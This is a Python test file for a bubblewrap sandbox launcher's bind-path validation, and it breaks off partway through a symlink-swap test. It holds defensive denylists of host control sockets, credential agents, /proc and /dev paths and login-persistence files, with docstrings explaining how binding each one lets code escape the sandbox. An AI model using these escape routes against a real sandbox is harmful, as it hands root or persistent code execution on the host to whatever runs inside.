#!/usr/bin/env python3
"""Launcher-logic tests for sbox.py (bind validation and friends).

Run without any dependencies:   python3 tests/test_sandbox.py
or under pytest, if installed:  pytest tests/
"""
import argparse
import errno
import os
import shutil
import socket
import stat
import sys
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import sbox  # noqa: E402

# Environment insensitivity: some distros/CI set TMPDIR=$XDG_RUNTIME_DIR —
# under /run — where binds are refused on purpose. The bind tests below
# need their scratch trees in plain /tmp (like $WORK itself) so they fail
# for the right reason, never for the runner's TMPDIR.
tempfile.tempdir = "/tmp"


def test_control_socket_binds_refused():
    """Binding a host control socket is a trivial full escape (docker/
    containerd = root, D-Bus/systemd = privileged services, X11 = input
    injection). They are only *children* of protected paths, which the
    covers() check deliberately allows (-b ~/proj must work), so they need
    their own rules: the CONTROL_SOCKETS denylist (with the same ancestor
    test, so parent dirs like -b /run/docker or -b ~/.gnupg are caught)
    plus the shape rule (anything under /run or any socket file)."""
    uid = os.getuid()
    refused = [
        # exact sockets
        "/run/docker.sock", "/var/run/docker.sock",
        "/run/podman/podman.sock",
        "/run/containerd/containerd.sock",
        "/run/crio/crio.sock",
        "/run/dbus/system_bus_socket",
        "/run/systemd/private",
        "/run/libvirt/libvirt-sock",
        "/run/snapd.socket", "/run/tailscale/tailscaled.sock",
        "/run/incus/unix.socket",
        "/tmp/.X11-unix", "/tmp/.X11-unix/X0",
        f"/run/user/{uid}/bus",
        f"/run/user/{uid}/gnupg/S.gpg-agent",
        f"/run/user/{uid}/pipewire-0",
        f"/run/user/{uid}/docker.sock",          # rootless daemons
        f"/run/user/{uid}/podman/podman.sock",
        f"/run/user/{uid}/systemd/private",
        f"/run/user/{uid}/keyring",              # gnome-keyring
        # parents of listed sockets (ancestor match, not exact)
        "/run/docker", "/run/dbus", "/run/libvirt", "/run/systemd",
        f"/run/user/{uid}/gnupg",
        # descendants of listed directories (bidirectional match — these
        # must be refused even via --bind-socket, the help promises it)
        f"/run/user/{uid}/keyring/ssh",
        "/run/podman/podman-run.sock",
        "/run/systemd/notify",
        f"/tmp/tmux-{uid}/ffmpeg.sock",
        "/tmp/.ICE-unix/1234",
        # shape rule: under /run even when not a known socket
        "/run/netns", "/run/myspeciald/control.sock",
    ]
    for path in refused:
        opts = argparse.Namespace(bind=[path], ro_bind=[], home=False,
                                  bind_socket=[])
        try:
            sbox.check_bind_paths(opts, "/home/sbox-test-user")
        except SystemExit:
            continue
        raise AssertionError(f"-b {path} was not refused")
    # ...and the bidirectional promise holds for --bind-socket too: a
    # descendant of a listed control-socket directory stays refused.
    for path in (f"/run/user/{uid}/keyring/ssh", "/run/podman/podman-run.sock"):
        opts = argparse.Namespace(bind=[], ro_bind=[], home=False,
                                  bind_socket=[path])
        try:
            sbox.check_bind_paths(opts, "/home/sbox-test-user")
        except SystemExit:
            continue
        raise AssertionError(f"--bind-socket {path} was not refused")


def test_bind_socket_opt_in():
    """--bind-socket is the explicit per-path opt-in for the shape rule
    (sockets, /run and friends) — but NOT for known control sockets or
    protected paths: those are never bindable."""
    def check(**kw):
        opts = argparse.Namespace(bind=kw.get("bind", []),
                                  ro_bind=kw.get("ro_bind", []),
                                  home=False,
                                  bind_socket=kw.get("bind_socket", []))
        return sbox.check_bind_paths(opts, "/home/sbox-test-user", kw.get("pinner"))

    # A socket file that exists (real S_ISSOCK): refused via -b, allowed
    # via --bind-socket — mounted READ-ONLY (connect() works through a
    # ro-bind; rw would let the sandbox replace the socket file).
    with tempfile.TemporaryDirectory(prefix="sbox-test.") as tmp:
        sock = os.path.join(tmp, "my.sock")
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.bind(sock)
        try:
            try:
                check(bind=[sock])
            except SystemExit:
                pass
            else:
                raise AssertionError("-b of a socket file was not refused")
            # no pinner (old bwrap): fd is None, the path form is used
            binds = check(bind_socket=[sock])
            assert binds == [("--ro-bind", sock, None)], binds
            # fd-first: with a pinner the socket check runs on the PINNED
            # object (fstat of the fd), and the fd travels with the triple
            pinner = sbox.BindPinner(enabled=True)
            try:
                binds = check(bind_socket=[sock], pinner=pinner)
                assert binds[0][:2] == ("--ro-bind", sock), binds
                fd = binds[0][2]
                assert fd is not None and stat.S_ISSOCK(os.fstat(fd).st_mode)
                assert fd in pinner.fds.values()
            finally:
                pinner.close()
        finally:
            s.close()

    # Shape rule opt-in for a path that need not exist (also ro, no fd —
    # bwrap's own not-found error is preserved).
    binds = check(bind_socket=["/run/netns"])
    assert binds == [("--ro-bind", "/run/netns", None)], binds

    # Known control sockets stay refused even with --bind-socket...
    try:
        check(bind_socket=["/run/docker.sock"])
    except SystemExit:
        pass
    else:
        raise AssertionError("--bind-socket /run/docker.sock was allowed")
    # ...and so do protected paths.
    try:
        check(bind_socket=["/etc"])
    except SystemExit:
        pass
    else:
        raise AssertionError("--bind-socket /etc was allowed")

    # Ordinary children of non-protected trees must keep working: the
    # triples carry the pinned fd for the --bind-fd mount (or None for
    # the path form when pinning is unavailable).
    with tempfile.TemporaryDirectory(prefix="sbox-test.") as tmp:
        binds = check(bind=[tmp])
        rp = os.path.realpath(tmp)
        assert binds == [("--bind", rp, None)], binds
        pinner = sbox.BindPinner(enabled=True)
        try:
            binds = check(bind=[tmp], pinner=pinner)
            fd = binds[0][2]
            assert fd is not None
            assert os.fstat(fd).st_ino == os.stat(rp).st_ino
        finally:
            pinner.close()

        # A socket-BEARING directory opts in via --bind-socket READ-WRITE
        # (the puma.sock / .s.PGSQL.5432 / fsmonitor project-cwd case:
        # -b of it stays refused, and a read-only mount would break the
        # build). Socket files and runtime paths stay read-only (above).
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.bind(os.path.join(tmp, "dev.sock"))
        try:
            pinner = sbox.BindPinner(enabled=True)
            try:
                binds = check(bind_socket=[tmp], pinner=pinner)
                assert binds[0][:2] == ("--bind", rp), binds   # rw opt-in
                assert binds[0][2] is not None
            finally:
                pinner.close()
            # -b of the same dir is STILL refused on its own
            try:
                check(bind=[tmp])
            except SystemExit:
                pass
            else:
                raise AssertionError("-b of a socket-bearing dir was allowed")
            # -r P --bind-socket P: the -r entry supplies the mount with
            # the mode the user asked for; --bind-socket must not emit a
            # second (rw) mount that shadows it back to read-write
            opts = argparse.Namespace(bind=[], ro_bind=[tmp], home=False,
                                      bind_socket=[tmp])
            binds = sbox.check_bind_paths(opts, "/home/sbox-test-user", None)
            assert binds == [("--ro-bind", rp, None)], binds
        finally:
            s.close()

        # A missing -b/-r source is a HARD error with a pinner (the path
        # form would re-open the swap race); only --bind-socket of a
        # not-yet-created runtime path keeps the path form.
        pinner = sbox.BindPinner(enabled=True)
        try:
            try:
                check(bind=[os.path.join(tmp, "gone")], pinner=pinner)
            except SystemExit:
                pass
            else:
                raise AssertionError("-b of a missing source was allowed with a pinner")
            binds = check(bind_socket=["/run/netns"], pinner=pinner)
            assert binds == [("--ro-bind", "/run/netns", None)], binds
        finally:
            pinner.close()
        # old bwrap (pinning unavailable): the path form still applies,
        # bwrap's own not-found error is preserved
        binds = check(bind=[os.path.join(tmp, "gone")])
        assert binds == [("--bind", os.path.join(tmp, "gone"), None)], binds


def test_bind_dir_socket_scan():
    """-b of a directory that CONTAINS a Unix socket is refused (bounded
    _contains_socket scan — closes the 'project dir with a dev-server
    socket' blind spot outside /run); --bind-socket opts in, and the scan
    stays cheap by bounding depth and entries. With a pinner the scan is
    rooted at /proc/self/fd/<fd> — the directory whose contents were
    checked is the directory that gets mounted."""
    def check(**kw):
        opts = argparse.Namespace(bind=kw.get("bind", []),
                                  ro_bind=kw.get("ro_bind", []),
                                  home=False,
                                  bind_socket=kw.get("bind_socket", []))
        return sbox.check_bind_paths(opts, "/home/sbox-test-user", kw.get("pinner"))

    with tempfile.TemporaryDirectory(prefix="sbox-test.") as tmp:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.bind(os.path.join(tmp, "dev.sock"))
        try:
            for pinner in (None, sbox.BindPinner(enabled=True)):
                try:
                    if pinner is None:
                        check(bind=[tmp])
                    else:
                        check(bind=[tmp], pinner=pinner)
                except SystemExit:
                    pass
                else:
                    raise AssertionError("-b of a socket-bearing dir was not refused")
                finally:
                    if pinner is not None:
                        pinner.close()
            # explicit opt-in: a DIRECTORY mounts READ-WRITE now (the
            # socket-bearing-project-cwd case; socket files and runtime
            # paths stay read-only — see test_bind_socket_opt_in)
            rp = os.path.realpath(tmp)
            binds = check(bind_socket=[tmp])
            assert binds[0][:2] == ("--bind", rp), binds
        finally:
            s.close()
        # socket unlinked: the same dir binds normally again
        os.unlink(os.path.join(tmp, "dev.sock"))
        binds = check(bind=[tmp])
        assert len(binds) == 1 and binds[0][:2] == ("--bind", os.path.realpath(tmp)), binds
        # beyond max_depth the bounded scan deliberately gives up
        deep = tmp
        for d in range(sbox._contains_socket.__defaults__[0] + 1):
            deep = os.path.join(deep, f"d{d}")
        os.makedirs(deep)
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        deep_sock = os.path.join(deep, "deep.sock")
        s.bind(deep_sock)
        try:
            binds = check(bind=[tmp])
            assert len(binds) == 1 and binds[0][:2] == ("--bind", os.path.realpath(tmp)), binds
        finally:
            s.close()
            os.unlink(deep_sock)


def test_pseudo_fs_binds_refused():
    """Binds INSIDE /proc, /sys and /dev are refused under every label —
    -b, -r, --bind-socket AND the automatic cwd mount: protected_paths
    only blocks ANCESTORS, and the descendants sailed through
    (--bind-socket /proc/self even resolved to a READ-WRITE bind of
    /proc/<launcher-pid>). A bind is not a fresh proc mount: /proc/<pid>/
    root and /proc/<pid>/fd/* are magic links resolving in the HOST
    task's context — ptrace_may_access(PTRACE_MODE_READ_FSCREDS) is a
    kuid comparison, so the same uid passes from a child user namespace
    and Yama does not apply to READ mode; with ptrace_scope=0,
    /proc/<pid>/mem is writable too. /dev/pts exposes every terminal's
    slave (read other terminals' keystrokes, write raw escapes to them);
    /dev/shm is shared IPC ground with host processes."""
    refused = [
        "/proc/self", f"/proc/{os.getpid()}", f"/proc/{os.getpid()}/fd",
        "/proc/self/root", "/proc/sysrq-trigger", "/proc/keys",
        "/sys/devices", "/sys/kernel", "/dev/pts", "/dev/shm", "/dev/mem",
    ]
    for path in refused:
        for kw in ({"bind": [path]}, {"ro_bind": [path]}, {"bind_socket": [path]}):
            opts = argparse.Namespace(bind=kw.get("bind", []),
                                      ro_bind=kw.get("ro_bind", []),
                                      home=False,
                                      bind_socket=kw.get("bind_socket", []))
            try:
                sbox.check_bind_paths(opts, "/home/sbox-test-user")
            except SystemExit:
                continue
            raise AssertionError(f"{list(kw)[0]} {path} was not refused")

    # the cwd goes through the SAME validator: cd /proc/<pid> must not
    # auto-mount, it falls back to the sandbox's /tmp with a warning
    import contextlib
    import io
    oldcwd = os.getcwd()
    os.chdir("/proc/self")
    buf = io.StringIO()
    try:
        opts = argparse.Namespace(net=True, home=False, gui=False, ssh_agent=False,
                                  ro_cwd=False, bind=[], ro_bind=[], bind_socket=[])
        with contextlib.redirect_stderr(buf):
            bw = sbox.build_bwrap(opts, "/tmp/sbox-test-sand", "/tmp/sbox-test-sock",
                                  "/home/sbox-test-user", [], None, None)[0]
    finally:
        os.chdir(oldcwd)
    assert bw[bw.index("--chdir") + 1] == "/tmp", bw
    # the refused cwd is not mounted anywhere in the argv (--proc /proc is
    # bwrap's own FRESH mount and must stay)
    assert f"/proc/{os.getpid()}" not in bw, bw
    assert "inside /proc" in buf.getvalue(), buf.getvalue()


def test_control_socket_symlinked_home():
    """The ~/.1password, ~/.docker and ~/.colima CONTROL_SOCKETS entries
    are expanded from $HOME without resolving symlinks, then compared
    against realpath'd bind sources: on systems where $HOME goes through
    a symlink (Fedora Silverblue/Kinoite: /home -> /var/home, or a $HOME
    that is itself a link) they never matched — --bind-socket
    ~/.docker/run/docker.sock handed the sandbox Docker Desktop (= root)
    and the --home note silently omitted the entry. _control_sockets()
    realpaths every entry at check time."""
    import contextlib
    import io
    with tempfile.TemporaryDirectory(prefix="sbox-test.") as base:
        real = os.path.join(base, "realhome")
        link = os.path.join(base, "home")       # $HOME goes through a symlink
        os.makedirs(os.path.join(real, ".docker", "run"), exist_ok=True)
        # the socket file exists (the --home note checks os.path.exists)
        open(os.path.join(real, ".docker", "run", "docker.sock"), "wb").close()
        if not os.path.lexists(link):
            os.symlink(real, link)
        entry = os.path.join(link, ".docker", "run", "docker.sock")
        saved = set(sbox.CONTROL_SOCKETS)
        sbox.CONTROL_SOCKETS.add(entry)
        try:
            # --bind-socket of the socket (the shape-rule opt-in path —
            # only the CONTROL_SOCKETS match can still refuse it)
            opts = argparse.Namespace(bind=[], ro_bind=[], home=False,
                                      bind_socket=[entry])
            try:
                sbox.check_bind_paths(opts, "/home/sbox-test-user")
            except SystemExit:
                pass
            else:
                raise AssertionError("control socket under a symlinked $HOME was allowed")
            # and the --home note names it (never silent)
            opts = argparse.Namespace(bind=[], ro_bind=[], home=True, bind_socket=[])
            buf = io.StringIO()
            with contextlib.redirect_stderr(buf):
                sbox.check_bind_paths(opts, link)
            assert "docker.sock" in buf.getvalue(), buf.getvalue()
        finally:
            sbox.CONTROL_SOCKETS.clear()
            sbox.CONTROL_SOCKETS.update(saved)


def test_bind_socket_rw_combination_refused():
    """-b P --bind-socket P must not yield a READ-WRITE mount of a socket
    file or a runtime-dir path: `explicit` exempted BOTH labels from the
    shape rule, the -b entry emitted --bind (rw — the sandbox can unlink
    and replace the socket, impersonating the host service to host
    clients) and the --bind-socket entry then saw the path as already
    bound. Connect-only ground is read-only, full stop; -r keeps working
    (the combination the docs promise)."""
    with tempfile.TemporaryDirectory(prefix="sbox-test.") as tmp:
        sock = os.path.join(tmp, "x.sock")
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.bind(sock)
        try:
            opts = argparse.Namespace(bind=[sock], ro_bind=[], home=False,
                                      bind_socket=[sock])
            try:
                sbox.check_bind_paths(opts, "/home/sbox-test-user")
            except SystemExit:
                pass
            else:
                raise AssertionError("-b S --bind-socket S of a socket file yielded a mount")
            opts = argparse.Namespace(bind=[], ro_bind=[sock], home=False,
                                      bind_socket=[sock])
            binds = sbox.check_bind_paths(opts, "/home/sbox-test-user")
            assert binds == [("--ro-bind", sock, None)], binds
        finally:
            s.close()

    # runtime-dir ground: $XDG_RUNTIME_DIR is honored (realpath'd) by
    # _runtime_roots — same rw refusal, same -r escape hatch
    with tempfile.TemporaryDirectory(prefix="sbox-test.") as xdg:
        saved = os.environ.get("XDG_RUNTIME_DIR")
        os.environ["XDG_RUNTIME_DIR"] = xdg
        try:
            app = os.path.join(xdg, "app")
            os.makedirs(app)
            opts = argparse.Namespace(bind=[app], ro_bind=[], home=False,
                                      bind_socket=[app])
            try:
                sbox.check_bind_paths(opts, "/home/sbox-test-user")
            except SystemExit:
                pass
            else:
                raise AssertionError("-b P --bind-socket P of a runtime dir yielded a mount")
            opts = argparse.Namespace(bind=[], ro_bind=[app], home=False,
                                      bind_socket=[app])
            binds = sbox.check_bind_paths(opts, "/home/sbox-test-user")
            assert binds == [("--ro-bind", app, None)], binds
        finally:
            if saved is None:
                os.environ.pop("XDG_RUNTIME_DIR", None)
            else:
                os.environ["XDG_RUNTIME_DIR"] = saved


def test_bind_socket_persistence_warning():
    """A --bind-socket DIRECTORY mounts READ-WRITE, so a bind covering
    $HOME persistence paths must warn exactly like -b does: the note used
    to be computed inside validate_bind_source gated on the label and
    never fired for --bind-socket (rw over systemd/user, autostart, ...
    with no note)."""
    import contextlib
    import io
    with tempfile.TemporaryDirectory(prefix="sbox-test.") as fake_home:
        os.makedirs(os.path.join(fake_home, ".config"))
        saved_env = {k: os.environ.get(k) for k in ("XDG_CONFIG_HOME", "XDG_DATA_HOME")}
        for k in saved_env:
            os.environ.pop(k, None)

        def stderr_of(**kw):
            opts = argparse.Namespace(bind=kw.get("bind", []),
                                      ro_bind=kw.get("ro_bind", []),
                                      home=False,
                                      bind_socket=kw.get("bind_socket", []))
            buf = io.StringIO()
            with contextlib.redirect_stderr(buf):
                sbox.check_bind_paths(opts, fake_home)
            return buf.getvalue()

        try:
            warned = stderr_of(bind_socket=[os.path.join(fake_home, ".config")])
            assert "persistence" in warned and ".config/systemd/user" in warned, warned
            # -b of the same plain (socket-free) dir warns as before
            assert "persistence" in stderr_of(bind=[os.path.join(fake_home, ".config")])
            # read-only stays silent
            assert "persistence" not in stderr_of(ro_bind=[os.path.join(fake_home, ".config")])
            # an unrelated --bind-socket dir stays silent
            other = os.path.join(fake_home, "plain")
            os.makedirs(other)
            assert "persistence" not in stderr_of(bind_socket=[other])
        finally:
            for k, v in saved_env.items():
                if v is None:
                    os.environ.pop(k, None)
                else:
                    os.environ[k] = v


def test_bind_policy_table():
    """Table-driven encoding of the mount-mode promises so the prose
    (docstring, epilog) and the code cannot drift apart silently: each
    row is flags in -> mount flag or REFUSED out. Add a row whenever a
    promise changes (this is the machine-readable version of the
    validate_bind_source docstring)."""
    with tempfile.TemporaryDirectory(prefix="sbox-test.") as tmp:
        sockfile = os.path.join(tmp, "s.sock")
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.bind(sockfile)
        sockdir = os.path.join(tmp, "proj")           # plain dir with a socket
        os.makedirs(sockdir)
        s2 = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s2.bind(os.path.join(sockdir, "dev.sock"))
        plaindir = os.path.join(tmp, "plain")
        os.makedirs(plaindir)
        try:
            rows = [
                # (bind, ro_bind, bind_socket, expected)
                # socket FILE: connect-only, never rw, opt-in is ro
                ([sockfile], [], [], "REFUSED"),
                ([], [sockfile], [], "REFUSED"),
                ([], [], [sockfile], "--ro-bind"),
                ([], [sockfile], [sockfile], "--ro-bind"),
                ([sockfile], [], [sockfile], "REFUSED"),
                # runtime-dir ground behaves like a socket file
                ([], [], ["/run/netns"], "--ro-bind"),
                ([], ["/run/netns"], ["/run/netns"], "--ro-bind"),
                # socket-BEARING plain dir: refused, rw opt-in, ro combo
                ([sockdir], [], [], "REFUSED"),
                ([], [], [sockdir], "--bind"),
                ([], [sockdir], [sockdir], "--ro-bind"),
                # plain dir: ordinary rw/-r binds, --bind-socket also rw
                ([plaindir], [], [], "--bind"),
                ([], [plaindir], [], "--ro-bind"),
                ([], [], [plaindir], "--bind"),
                # pseudo-fs ground: no opt-in at all
                (["/proc/self"], [], [], "REFUSED"),
                ([], [], ["/proc/self"], "REFUSED"),
            ]
            for bind, ro, bsock, want in rows:
                opts = argparse.Namespace(bind=bind, ro_bind=ro, home=False,
                                          bind_socket=bsock)
                try:
                    binds = sbox.check_bind_paths(opts, "/home/sbox-test-user")
                except SystemExit:
                    assert want == "REFUSED", (bind, ro, bsock, "refused unexpectedly")
                    continue
                assert want != "REFUSED", (bind, ro, bsock, binds)
                assert binds[0][0] == want, (bind, ro, bsock, binds)
        finally:
            s.close()
            s2.close()


def test_contains_socket_bounds():
    """Directories count toward the entry cap (a directory-heavy tree
    must not turn the cap into "walk everything") and hitting the cap is
    fail-open BY DESIGN — but loudly ONCE A DAY (or with --verbose): a
    large cwd would otherwise print the note on every launch."""
    import contextlib
    import io
    with tempfile.TemporaryDirectory(prefix="sbox-test.") as tmp:
        # dirs alone blow a small cap: 3 dirs + 1 file > 3 entries
        for i in range(3):
            os.makedirs(os.path.join(tmp, f"d{i}"))
        open(os.path.join(tmp, "d2", "f"), "wb").close()
        assert sbox._contains_socket(tmp, max_depth=3, max_entries=3) is None

        # the give-up prints a note naming the HOST path (not /proc pins)
        # ...once: a fresh cache dir makes the first call "not recent",
        # the stamp suppresses the second; --verbose overrides the stamp
        cache = os.path.join(tmp, "cache")
        os.environ["XDG_CACHE_HOME"] = cache
        buf = io.StringIO()
        buf2 = io.StringIO()
        try:
            with contextlib.redirect_stderr(buf):
                sbox._contains_socket(tmp, max_depth=3, max_entries=2, shown=tmp)
                sbox._contains_socket(tmp, max_depth=3, max_entries=2, shown=tmp)
            sbox.mark_note_shown("socket-scan-gaveup.note")
            with contextlib.redirect_stderr(buf2):
                sbox._contains_socket(tmp, max_depth=3, max_entries=2, shown=tmp,
                                      verbose=True)
        finally:
            os.environ.pop("XDG_CACHE_HOME", None)
        assert buf.getvalue().count("gave up") == 1, buf.getvalue()
        assert tmp in buf.getvalue(), buf.getvalue()
        assert "gave up" in buf2.getvalue(), buf2.getvalue()

        # and a socket is still found under the dir-counting regime
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.bind(os.path.join(tmp, "d0", "x.sock"))
        try:
            found = sbox._contains_socket(tmp, max_depth=3, max_entries=10)
            assert found and found.endswith("x.sock"), found
        finally:
            s.close()


def test_xdg_runtime_dir_ancestor_bind_refused():
    """When $XDG_RUNTIME_DIR lives outside /run, an ANCESTOR bind of it
    (-b of its parent) used to slip past the runtime-root shape rule
    (which only catches the root and descendants) and depended on the
    depth-3 socket scan. protected_paths now includes the resolved root,
    so the ancestor is refused on shape, not on luck."""
    import contextlib
    import io
    with tempfile.TemporaryDirectory(prefix="sbox-test.") as base:
        xdg = os.path.join(base, "xdg", "run")
        os.makedirs(xdg)
        saved = os.environ.get("XDG_RUNTIME_DIR")
        os.environ["XDG_RUNTIME_DIR"] = xdg
        try:
            # the ancestor (-b of base) and the root itself: both refused
            for path in (base, os.path.realpath(xdg)):
                opts = argparse.Namespace(bind=[path], ro_bind=[], home=False,
                                          bind_socket=[])
                try:
                    with contextlib.redirect_stderr(io.StringIO()):
                        sbox.check_bind_paths(opts, "/home/sbox-test-user")
                except SystemExit:
                    continue
                raise AssertionError(f"-b {path} (XDG_RUNTIME_DIR={xdg}) was not refused")
            # and unrelated trees keep binding normally
            other = os.path.join(base, "elsewhere")
            os.makedirs(other)
            opts = argparse.Namespace(bind=[other], ro_bind=[], home=False,
                                      bind_socket=[])
            binds = sbox.check_bind_paths(opts, "/home/sbox-test-user")
            assert binds == [("--bind", other, None)], binds
        finally:
            if saved is None:
                os.environ.pop("XDG_RUNTIME_DIR", None)
            else:
                os.environ["XDG_RUNTIME_DIR"] = saved


def test_cwd_refusal_silent_when_user_bind_covers():
    """A refused cwd that an explicit user bind already covers must NOT
    print the "NOT mounting the cwd / runs with /tmp" warning: --chdir
    lands exactly where the user asked (the same covers() test picks the
    chdir target), so the note would be wrong. The refusal still skips
    the automatic mount (the user's flag decides its mode), and an
    uncovered refusal keeps warning loudly."""
    import contextlib
    import io
    oldcwd = os.getcwd()
    saved_socks = set(sbox.CONTROL_SOCKETS)
    try:
        with tempfile.TemporaryDirectory(prefix="sbox-test.") as tmp:
            ctl = os.path.join(tmp, "ctl")
            os.makedirs(ctl)
            rp = os.path.realpath(ctl)
            sbox.CONTROL_SOCKETS.add(rp)     # make the cwd refusable

            def build(binds):
                opts = argparse.Namespace(net=True, home=False, gui=False,
                                          ssh_agent=False, ro_cwd=False,
                                          bind=[], ro_bind=[], bind_socket=[])
                buf = io.StringIO()
                os.chdir(ctl)
                with contextlib.redirect_stderr(buf):
                    bw = sbox.build_bwrap(opts, "/tmp/sbox-test-sand",
                                          "/tmp/sbox-test-sock",
                                          "/home/sbox-test-user", binds,
                                          None, None)[0]
                return bw, buf.getvalue()

            # uncovered: loud warning, --chdir /tmp
            bw, notes = build([])
            assert bw[bw.index("--chdir") + 1] == "/tmp", bw
            assert "NOT mounting the cwd" in notes, notes
            # covered by -r "$PWD": silent, --chdir lands there, mounted ro
            bw, notes = build([("--ro-bind", rp, None)])
            assert bw[bw.index("--chdir") + 1] == rp, bw
            assert "--ro-bind" in bw and rp in bw, bw
            assert "NOT mounting the cwd" not in notes, notes
    finally:
        os.chdir(oldcwd)
        sbox.CONTROL_SOCKETS.clear()
        sbox.CONTROL_SOCKETS.update(saved_socks)


def test_home_bind_exempt_and_warned():
    """-b $HOME --home re-binds what --home binds anyway: it must not die
    on the CONTROL_SOCKETS check (it used to, over ~/.1password/agent.sock,
    while plain --home bound the same tree silently). The risk is surfaced
    as a note instead — never silent, never fatal for the whole-home case.
    Narrow binds under $HOME keep being refused."""
    with tempfile.TemporaryDirectory(prefix="sbox-test.") as fake_home:
        real = os.path.realpath(fake_home)
        agent = os.path.join(real, ".1password", "agent.sock")
        os.makedirs(os.path.dirname(agent), exist_ok=True)
        open(agent, "wb").close()
        saved = set(sbox.CONTROL_SOCKETS)
        sbox.CONTROL_SOCKETS.add(agent)
        try:
            # plain --home (no -b): warns (note printed above the PASS line)
            opts = argparse.Namespace(bind=[], ro_bind=[], home=True, bind_socket=[])
            assert sbox.check_bind_paths(opts, fake_home) == []
            # -b $HOME --home: exempt from the socket checks, still warns;
            # the triple carries the PINNED fd (fd-first validation)
            opts = argparse.Namespace(bind=[fake_home], ro_bind=[], home=True,
                                      bind_socket=[])
            pinner = sbox.BindPinner(enabled=True)
            try:
                binds = sbox.check_bind_paths(opts, fake_home, pinner)
                assert binds[0][:2] == ("--bind", real), binds
                fd = binds[0][2]
                assert fd is not None and os.fstat(fd).st_ino == os.stat(real).st_ino
            finally:
                pinner.close()
            # narrow bind of the socket itself: still refused, --home or not
            for home_flag in (True, False):
                opts = argparse.Namespace(bind=[agent], ro_bind=[],
                                          home=home_flag, bind_socket=[])
                try:
                    sbox.check_bind_paths(opts, fake_home)
                except SystemExit:
                    continue
                raise AssertionError(f"-b of control socket allowed (home={home_flag})")
        finally:
            sbox.CONTROL_SOCKETS.clear()
            sbox.CONTROL_SOCKETS.update(saved)


def test_persistence_binds_warned():
    """A read-write bind covering a known $HOME persistence path (shell rc
    and session files, authorized_keys, systemd user units, autostart,
    environment.d, ~/.local/bin, ~/.cargo/bin, ...) is host code execution
    at next login — warned loudly, not refused, and in BOTH directions: a
    descendant (-b ~/.local/bin/mytool, a single unit file) is as dangerous
    as an ancestor. Read-only binds and unrelated directories stay silent.
    XDG env is cleared/set explicitly: persistence_paths honors
    $XDG_CONFIG_HOME/$XDG_DATA_HOME, and an ambient absolute value on the
    test machine must not leak into the fake home."""
    import contextlib
    import io
    with tempfile.TemporaryDirectory(prefix="sbox-test.") as fake_home:
        os.makedirs(os.path.join(fake_home, ".config"))
        for name in (".bashrc", ".profile"):
            open(os.path.join(fake_home, name), "wb").close()

        saved_env = {k: os.environ.get(k) for k in ("XDG_CONFIG_HOME", "XDG_DATA_HOME")}
        for k in saved_env:
            os.environ.pop(k, None)

        def stderr_of(**kw):
            opts = argparse.Namespace(bind=kw.get("bind", []),
                                      ro_bind=kw.get("ro_bind", []),
                                      home=False, bind_socket=[])
            buf = io.StringIO()
            with contextlib.redirect_stderr(buf):
                sbox.check_bind_paths(opts, fake_home)
            return buf.getvalue()

        try:
            warned = stderr_of(bind=[os.path.join(fake_home, ".config")])
            assert "persistence" in warned and ".config/systemd/user" in warned, warned
            # exact file, umbrella -b of the home tree root children, and a
            # path whose ANCESTOR relationship goes the other way are covered
            assert "persistence" in stderr_of(bind=[os.path.join(fake_home, ".bashrc")])
            assert "authorized_keys" in stderr_of(bind=[os.path.join(fake_home, ".ssh")])
            # DESCENDANTS warn too (both directions): a tool on PATH, a
            # single unit file, cargo/go bin dirs
            assert "persistence" in stderr_of(
                bind=[os.path.join(fake_home, ".local", "bin", "mytool")])
            assert "persistence" in stderr_of(
                bind=[os.path.join(fake_home, ".config", "systemd", "user", "foo.service")])
            assert "persistence" in stderr_of(bind=[os.path.join(fake_home, ".cargo", "bin")])
            assert "persistence" in stderr_of(bind=[os.path.join(fake_home, "go", "bin")])
            # read-only is fine (planting requires write), unrelated paths
            # stay silent
            assert "persistence" not in stderr_of(ro_bind=[os.path.join(fake_home, ".config")])
            assert "persistence" not in stderr_of(bind=[os.path.join(fake_home, "src")])

            # an explicit absolute XDG override is honored (and does not
            # warn for paths under the DEFAULT config home anymore)
            os.environ["XDG_CONFIG_HOME"] = os.path.join(fake_home, "cfg-x")
            warned = stderr_of(bind=[os.path.join(fake_home, "cfg-x")])
            assert "persistence" in warned and "cfg-x/systemd/user" in warned, warned
            assert "persistence" not in stderr_of(bind=[os.path.join(fake_home, ".config")])
        finally:
            for k, v in saved_env.items():
                if v is None:
                    os.environ.pop(k, None)
                else:
                    os.environ[k] = v


def test_open_path_pinned():
    """The TOCTOU closer, fd-first edition: a component walk
    (openat O_PATH|O_NOFOLLOW) whose input is always a realpath() result,
    so ANY symlink met on the walk — intermediate or final — is a swap
    and is refused. A naive realpath+open() would happily pin the
    attacker's substitution; there is no longer any "expected inode" to
    compare against: the fd you get is the fd you validate and mount."""
    with tempfile.TemporaryDirectory(prefix="sbox-test.") as tmp:
        os.makedirs(f"{tmp}/a/b")
        open(f"{tmp}/a/b/target", "wb").write(b"x")
        st = os.stat(f"{tmp}/a/b/target")

        fd = sbox.open_path_pinned(f"{tmp}/a/b/target")
        assert os.fstat(fd).st_ino == st.st_ino
        os.close(fd)

        # a resolved symlink chain is a plain path by the time it gets
        # here (realpath removed the links) — the walk sees no symlinks
        os.symlink(f"{tmp}/a/b/target", f"{tmp}/link")
        rp = os.path.realpath(f"{tmp}/link")
        fd = sbox.open_path_pinned(rp)
        assert os.fstat(fd).st_ino == st.st_ino
        os.close(fd)
        os.makedirs(f"{tmp}/a/c", exist_ok=True)
        os.symlink("../b/target", f"{tmp}/a/c/rel")
        rp = os.path.realpath(f"{tmp}/a/c/rel")
        fd = sbox.open_path_pinned(rp)
        assert os.fstat(fd).st_ino == st.st_ino
        os.close(fd)

        # THE attack, intermediate component: swap a directory for a
        # symlink after realpath() — the walk must refuse (the OLD design
        # chased the symlink and relied on a later inode comparison).
        os.makedirs(f"{tmp}/evil")
        open(f"{tmp}/evil/target", "wb").write(b"evil")
        validated = f"{tmp}/a/b/target"
